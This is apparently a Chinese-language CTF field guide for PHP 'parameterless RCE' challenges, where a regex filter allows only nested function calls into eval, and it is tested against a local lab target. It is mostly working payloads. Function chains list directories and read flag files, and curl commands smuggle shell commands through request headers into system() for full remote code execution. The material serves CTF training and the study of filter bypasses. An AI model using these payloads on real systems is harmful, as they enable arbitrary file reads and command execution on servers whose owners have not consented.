> 命令环境：**CMD**（curl 双引号内原样粘贴；payload 里的 `()` `;` `_` 在 URL 查询串里合法，无需编码）
> 定位：**战地百科**，覆盖本题型标准武备
> 验证标注：✓(YYYY-MM-DD)=当日靶机实弹；未标注 = 原理成立未搭场景
> 靶场：http://localhost:37300/（php-batch，封禁 session_id/readfile，flag 在上级 /var/www/）
> 全部链路 ✓(2026-08-26/27 首杀实弹) ✓(2026-08-30 复验 8+2 发全中，含 B1/B2 装配链)
> 首杀战例：php-batch `flag{no_param_rce_first_blood}`（2026-08-26）

## 0. 拿到题先走这个流程
========================================================

```
1. 认题型：preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['code']) + eval -> 无参数 RCE
2. 看封禁名单：题目点名禁了谁（如 readfile / session_id）-> 那是两条大路的路口，先想替身
3. 侦查：列当前目录 -> 列目标目录 -> 掏出目标文件名（第 3 节）；格子算不动就随机摸（第 5 节）
4. 读旗：函数被封找替身（第 2 节）；路径不够 -> 走私（第 6 节）或装配（第 7 节）；要真 RCE 就走私送命令
5. 纪律：新函数单独 print_r 验返回值 ｜ 一次只改一个变量 ｜ 哑火先纸上逐层验尸
```

## 1. 判定规则：零字面量
========================================================

> 放行的只有一种形态：**函数嵌套调用**--函数名（字母、下划线）+ 括号，括号里可以再嵌一个同样的东西（`(?R)` = 此处可递归）。
> 禁掉的是**一切字面量**：字符串、数字、运算符、变量。

| 检查项 | 规则 |
|--------|------|
| 整体判定 | 所有函数调用被替换掉后，剩下的必须严格 `=== ';'` |
| 末尾 | 必须带分号 |
| 被禁 | `'flag.txt'`、`123`、`a.b`、`$x`、`[0]`、`+` `.` `=` 运算符 |
| 放行 | `a-z` `_` `(` `)` 和嵌套；**include 这种语言结构也照样过正则**（见第 5 节彩蛋） |

**装配防呆**：长链别一口气打完。从最里层开始一层层往外套（`localeconv()` -> `pos(..)` -> `scandir(..)` -> ...），每套一层括号自然配平；打完数一遍开括号闭括号个数。眼数不可靠，教练也翻过车。

========================================================
## 2. 武器库（每个函数：干什么 + 返回什么）
========================================================

**字符串/数组来源（零字面量世界的兵工厂）**

| 函数 | 干什么 | 返回 | 进管线？ |
|------|--------|------|---------|
| localeconv() | 吐本地化格式大数组，**第一格是 `'.'`** | 数组 | ✅ |
| getcwd() | 当前目录绝对路径 | 字符串 | ✅ |
| scandir() | **列目录**清单（动词是"列"，不是"跳转"） | 数组 | ✅ |
| getallheaders() | 所有请求头装成数组（Apache 限定） | 数组 | ✅ |
| session_id() | Cookie 里 PHPSESSID 的值（官方走私通道，常被禁） | 字符串 | ✅ |

**数组导航与加工（指针家族 + 加工厂）**

| 函数 | 干什么 | 返回 | 进管线？ |
|------|--------|------|---------|
| pos() / current() | 指针当前元素（pos 是 current 的别名） | 元素值 | ✅ |
| next() | 指针前进一格并返回新元素 | 元素值 | ✅ |
| end() | 指针跳到最后并返回 | 元素值 | ✅ |
| reset() | 指针回到开头 | 元素值 | ✅ |
| array_reverse() | 数组倒序 | **新数组** | ✅ 交付型 |
| array_flip() | 键值互换 | 新数组 | ✅ |
| array_rand() | 随机抽一个**键名** | 键名（常配合 array_flip 摸文件名） | ✅ |
| rsort() / sort() | 原地排序 | **true/false** | ❌ 原地动手型 |
| shuffle() | 原地打乱 | **true** | ❌ 原地动手型 |

**路径操作**

| 函数 | 干什么 | 返回 | 进管线？ |
|------|--------|------|---------|
| dirname() | 路径剥掉最后一段（嵌套层数 = 爬几层） | 字符串 | ✅ |
| chdir() | 切换当前目录 | **true/false** | ❌ 原地动手型（配合 dirname 洗衣，见第 7 节） |
| realpath() | 解析成真实绝对路径 | 字符串/False | ✅ |

**读文件 / 执行命令（火力单元）**

| 函数 | 干什么 | 返回 | 进管线？ |
|------|--------|------|---------|
| highlight_file() / show_source() | 读文件并高亮**直接吐进页面**（同一函数两个名） | 直接输出 | ✅ |
| file_get_contents() | 读文件进字符串 | 字符串（要配 print_r 接货） | ✅ |
| file() | 读文件按行装进数组 | 数组（配 print_r） | ✅ |
| readgzfile() | 读文件并输出（readfile 的 gzip 表亲，常没被禁） | 直接输出 | ✅ |
| readfile() | 读文件直接输出 | 直接输出 | ✅（常被禁） |
| include | 语言结构非函数，但**正则照样放行**；无 PHP 标签的文件原样输出 | 直接输出 | ✅ |
| system() / passthru() | 执行 shell 命令**并直接输出**（弹药从走私通道来） | 直接输出 | ✅ |
| exec() / shell_exec() | 执行命令，返回输出字符串 | 字符串（配 print_r） | ✅ |
| fopen() | 打开文件 | resource（钥匙不是货） | ❌ 还必须 2 个参数 |
| print_r() | 打印变量（调试 / 接货两用） | - | ✅ |

**指针家族速记**：pos=current=现在 ｜ next=下一格 ｜ end=最后 ｜ reset=回开头。它们只认喂到嘴边的数组，**不认你的意图**。

## 3. 侦查：提取链全景（列目录 / 掏元素）
========================================================

```php
// ① 列当前目录
print_r(scandir(pos(localeconv())));
// Array ( [0] => .  [1] => ..  [2] => Dockerfile ... )

// ② 列父目录（'..' 是当前清单第 2 格，用 next 掏）
print_r(scandir(next(scandir(pos(localeconv())))));

// ③ 掏目标元素（目标在第 3 格 -> 倒序后变第 2 格 -> next 够得着）
print_r(next(array_reverse(scandir(next(scandir(pos(localeconv())))))));
// 输出：flag.txt
```

**每层职责**：
```
localeconv()   -> 吐大数组
pos()          -> 掏 '.'
scandir()      -> 列当前目录
next()         -> 掏 '..'（清单第 2 格）
scandir()      -> 列父目录
array_reverse  -> 清单倒序
next()         -> 掏倒序后第 2 格（= 原第 3 格）
print_r()      -> 打印
```

**掏第 N 格通用公式**：倒序换位——总格数 n 时，**原第 k 格 = 倒序第 (n−k+1) 格**。
速记：原最后 1 格 = 倒序第 1 格（pos 够得着）；原第 1 格 = 倒序最后 1 格（end 够得着）；
例（父目录 n=4：. .. flag.txt html）：原第 3 格(flag.txt) = 倒序第 2 格 → next 够得着 ✓。
⚠️ "原第 3 格 = 倒序第 2 格"只在 n=4 成立（2026-08-30 自查更正）——数错格子先数清 n。

## 4. 返回值安检（最重要的规则）
========================================================

> **管线里流动的只有返回值。**

| 类型 | 特征 | 例子 | 进管线？ |
|------|------|------|---------|
| 交付型 | 干完活把成品递出来 | scandir / next / array_reverse / highlight_file | ✅ |
| 原地动手型 | 现场倒腾（副作用），只回报"办完了" | rsort / chdir / shuffle | ❌ 下游收到 true，饿死 |

**反面教材**（都亲手踩过）：
- `rsort(清单)` -> next 收到 true -> 全链寂静。print_r 出来孤零零一个 `1`，就是它的供词
- `fopen` -> 双杀：必须 2 个参数（管线只供得起 1 个）+ 返回 resource 是钥匙不是货
- **安检门**：新函数上岗前，手册词条里看两栏--签名（几个必需参数？）+ 返回值（递的是成品还是状态？）

## 5. 组合技弹药库
========================================================

**① 随机摸文件（格子算不动 / 清单太长时）**：
```php
// array_flip 键值互换（文件名变键），array_rand 随机抽一个键 = 随机一个文件名
print_r(array_rand(array_flip(scandir(pos(localeconv())))));
// 多打几发，撞到目标为止；配合读函数就是随机读文件
```

**② dirname 嵌套爬楼（层数自己定）**：
```php
print_r(scandir(dirname(getcwd())));           // 列父目录（爬 1 层）
print_r(scandir(dirname(dirname(getcwd()))));  // 列根目录（爬 2 层，flag 常住 /flag）
```

**③ 走私通道是万能货舱**：送路径 = 读文件；送命令 + system = **真 RCE**：
```bash
curl -H "X-Cmd: cat /var/www/flag.txt" -G "http://localhost:37300/" \
  --data-urlencode "code=system(end(getallheaders()));"
```
（✓2026-08-30：system 走私实测回显 whoami=www-data。`-G` 把 data 挂到查询串；CMD 下这行原样能跑）

**④ include 彩蛋**：语言结构不是函数，但正则只认 `[a-z,_]+\(...\)` 的形状，照样放行。无 PHP 标签的文件（如 flag.txt / Dockerfile）被 include 会**原样吐出**（✓2026-08-30：include Dockerfile 实测原样回显，带 BOM 也照吐）：
```bash
curl -H "X-Read: ../flag.txt" -G "http://localhost:37300/" \
  --data-urlencode "code=include(end(getallheaders()));"
```

**⑤ getallheaders 不可用时（nginx 无 Apache）**【未实弹·原理成立】：走私通道换
`get_defined_vars()`（零参数，返回作用域内全部变量含超全局）或 session 系（本靶已禁）；
思路不变——找一个"内容你说了算"的零参数来源。

## 6. 读旗路线 A：请求头走私（短平快，首选）
========================================================

> **光秃秃的相对路径，永远从当前目录开始找**（这题的当前目录是 /var/www/html）。
> flag.txt 住在上一层，所以光名字会在当前层扑空；`../` 的意思是"先从脚下往上爬一层，再找"。（fi2 的老规则）

```bash
# 请求头是内容你说了算的自留地（fi5 投毒同款思想）
# getallheaders() 把所有头装成数组；curl 的自定义头排在所有标准头后面 -> end() 掏到的就是你的货
curl -H "X-Read: ../flag.txt" -G "http://localhost:37300/" \
  --data-urlencode "code=highlight_file(end(getallheaders()));"
```

**三层分工**：getallheaders() 吐头数组 -> end() 掏最后一个（你的走私头）-> highlight_file() 读并输出。

**变体**：Cookie 也是自留地--`session_id()` 返回 Cookie 值，是官方内置的走私通道（所以常被禁）。

## 7. 读旗路线 B：装配到底（chdir + dirname 洗衣）
========================================================

思路：光秃文件名在当前目录扑空？那把**当前目录搬过去**。`chdir('..')` 之后，光秃的 `flag.txt` 就指对楼了。
难点：chdir 返回 true，进不了管线--用 dirname 洗一遍：`dirname(true)` = `dirname('1')` = `'.'`（不含斜杠的字符串，爹就是 `'.'`）。

```php
// B1：chdir 吃的是提取链掏出来的 '..'（原装链装配到底）
print_r(highlight_file(next(array_reverse(scandir(dirname(chdir(next(scandir(pos(localeconv()))))))))));

// B2：用 dirname(getcwd()) 直接拿父目录绝对路径，短两层
print_r(highlight_file(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))))));
```

**每层职责**（B2 为例）：
```
getcwd()       -> '/var/www/html'
dirname()      -> '/var/www'（剥最后一段 = 父目录路径）
chdir()        -> 搬家到父目录（true 只是收条）
dirname(true)  -> '.'（把 true 洗成"当前目录"字符串）
scandir('.')   -> 列父目录（CWD 已搬过去了！）
array_reverse  -> 倒序
next()         -> 掏 'flag.txt'
highlight_file -> 读并输出（光秃名字这次指对了楼）
```

**双路对比**：走私路短（3 层）但要带外配合（curl -H）；装配路长（9~11 层）但一个 URL 全搞定。实战先试走私；环境没有 Apache / 没有 getallheaders 时上装配。

## 8. 报错导航
========================================================

| 现象 | 意思 | 怎么办 |
|------|------|--------|
| 页面寂静、无 Array | 某层断粮（吃错类型 / false） | 纸上逐层验尸，每层单独 print_r |
| print_r 出来一个 `1` | 拿到的是 true | 该函数是原地动手型，进不了管线 |
| "不让用session欧，readfile也不行" | 撞封禁名单 | 换替身，别恋战 |
| 页面正常但 code 像没执行 | 正则判定没过 | 查字面量残留 / 括号配平 / 末尾分号 |
| 掏出来的是 web3.php / html | 指针函数吃错清单或位置算错 | 回去数格子；倒序图重画一遍 |
| 什么都连不上 / 全部哑火 | **靶机死了** | `docker ps` 先看容器。链路对却全哑，先怀疑靶子再怀疑自己（2026-08-27 教练亲测翻车：Docker 引擎挂了还在验尸 payload） |

## 心法
========================================================

> 只放行函数嵌套 = 零字面量 ｜ 侦查链告诉你旗在哪，走私链把武器送过去 ｜ 返回值是唯一通货 ｜ 新函数先过安检再上岗 ｜ 格子算不动就随机摸 ｜ dirname 嵌套层数 = 爬楼层数 ｜ 一次只改一个变量 ｜ 哑火先验靶机，再验自己
